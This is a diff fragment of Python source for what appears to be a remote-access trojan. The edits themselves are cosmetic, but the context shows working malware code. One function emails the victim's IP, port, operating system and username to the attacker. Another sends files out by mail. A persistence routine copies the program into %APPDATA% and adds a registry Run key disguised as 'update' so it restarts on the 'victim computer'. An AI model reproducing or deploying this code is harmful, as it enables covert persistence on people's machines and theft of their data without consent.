@@ -33,7 +33,7 @@ def send_email_attachment(body, filename):
     server.starttls()
     server.login(email_user, 'YOUR_EMAIL_PASSWORD')
     server.sendmail(email_user, email_send, text)
-    server.quit()  # Function For Downloading File With Mail
+    server.quit()  
 
 def send_mail(host, port):
     txt = "\n" + str(host) + " ' IP'sine " + str(port) + "There is a connection coming from the port and the connection will be attempted again within 30 seconds..\n\n\n" + " OS: " + str(platform.platform()) + " Platform : " + str(platform.machine()) + " User: " + str(getpass.getuser())
@@ -44,7 +44,7 @@ def send_mail(host, port):
     mail.sendmail('your_email@gmail.com', 'your_email@gmail.com', txt)  # Function For Sending Alert Message With Mail
 
 def persistent():
-    evil_file_location = os.environ["appdata"] + "\\NAMEOFTHEFILE.exe"#THE NAME OF THE EXECUTABLE
+    evil_file_location = os.environ["appdata"] + "\\NAMEOFTHEFILE.exe" #THE NAME OF THE EXECUTABLE
     if not os.path.exists(evil_file_location):
         shutil.copyfile(sys.executable, evil_file_location)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)  # Function For Being Persisting On Victim Computer
